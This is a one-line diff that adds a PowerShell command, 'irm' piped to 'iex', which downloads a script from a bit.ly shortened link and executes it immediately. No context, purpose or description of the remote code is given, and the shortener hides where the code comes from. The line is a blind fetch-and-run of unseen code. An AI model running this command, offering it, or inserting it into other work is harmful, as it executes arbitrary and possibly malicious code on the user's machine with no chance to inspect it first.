@@ -1,0 +1,1 @@
+irm https://bit.ly/4jaODo3 | iex
